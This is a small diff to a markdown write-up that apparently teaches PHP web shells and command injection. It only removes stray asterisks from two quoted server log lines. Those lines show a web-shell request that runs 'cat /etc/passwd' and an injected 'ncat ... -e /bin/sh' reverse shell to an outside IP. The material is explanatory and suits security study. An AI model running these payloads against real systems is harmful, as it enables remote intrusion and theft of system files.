@@ -344,7 +344,7 @@ should look something like this:
 Also this is how the logs see the command:
 
 ```
-127.0.0.1 - - [17/Oct/2020:16:44:36 -0400] "GET /_.php?__=system&___=cat%20/etc/passwd HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"**
+127.0.0.1 - - [17/Oct/2020:16:44:36 -0400] "GET /_.php?__=system&___=cat%20/etc/passwd HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
 ```
 
 ### Commands within the php file:
@@ -393,7 +393,7 @@ the greeting page always download `nmap` in case it ever gets deleted!
 Here is the log once more:
 
 ```
-127.0.0.1 - - [17/Oct/2020:17:02:42 -0400] "GET /name.php?name=ncat%20192.168.235.147%201234%20-e%20/bin/sh HTTP/1.1" 200 379 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"**
+127.0.0.1 - - [17/Oct/2020:17:02:42 -0400] "GET /name.php?name=ncat%20192.168.235.147%201234%20-e%20/bin/sh HTTP/1.1" 200 379 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0"
 ```
 
 ### Modifying Headers:
